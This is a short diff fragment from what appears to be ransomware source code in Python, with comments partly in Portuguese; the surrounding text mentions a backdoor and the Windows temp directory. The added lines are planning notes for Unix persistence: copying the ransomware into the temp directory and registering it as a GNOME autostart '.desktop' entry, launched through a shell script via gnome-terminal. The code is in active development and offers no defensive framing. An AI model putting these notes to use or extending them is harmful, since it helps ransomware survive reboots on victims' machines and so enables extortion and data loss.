@@ -42,6 +42,25 @@ TEMPDIR = tempfile.gettempdir() # diretório temporario do windows, onde será s
  Backdoor complete (Only when all features ready).
 
  DOWNLOAD ALL FILES IN ONE FOLDER
+
+
+ UNIX PERSISTENCE :
+        https://askubuntu.com/questions/48321/how-do-i-start-applications-automatically-on-login
+    copiar ransomware para -> TEMPDIR
+    file -> ransomware.desktop
+
+    UBUNTU
+    [Desktop Entry]
+    Type=Application
+    Name=<Name of application as displayed>
+    Exec=<command to execute>
+    Icon=<full path to icon>
+    Comment=<optinal comments>
+    X-GNOME-Autostart-enabled=true
+
+    GNOME gnome-session-properties
+
+    criar um sh -> gnome-terminal  -e  "/batch-path/batch-name.sh"
 '''
 
 # funcão que vai ser executada por uma thread
